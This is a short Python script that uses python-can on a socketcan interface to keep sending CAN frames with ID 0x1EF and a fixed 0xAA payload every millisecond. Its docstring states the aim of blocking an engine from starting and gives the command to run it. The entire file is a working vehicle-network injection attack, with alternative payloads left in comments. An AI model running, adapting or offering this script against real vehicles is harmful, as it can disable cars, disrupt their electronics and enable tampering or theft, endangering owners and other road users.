"""
Goal: block eng start
How to: run python3 car_filter.py
Doc: the code "block" eng by send id 1EF with data AAAAAAAAAAAAAAAA on freq 0.001s
"""

import can
import time
can.rc['interface'] = 'socketcan_native'
ecuId = 0x1EF

can_filters = []
can_filters.append({"can_id": ecuId, "can_mask": 0x7FF})
bus = can.interface.Bus('can0', can_filters=can_filters)
# msg = can.Message(arbitration_id=ecuId, data=[0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00], extended_id=False)
# msg = can.Message(arbitration_id=ecuId, data=[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF], extended_id=False)
msg = can.Message(arbitration_id=ecuId, data=[0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA], extended_id=False)

#     def send_periodic(self, msg, period, duration=None, store_task=True):
# a = bus.send_periodic(msg, 0.01, 120,True)
while True:
    bus.recv()
    bus.send(msg)
    time.sleep(0.001)
    # print("in loop")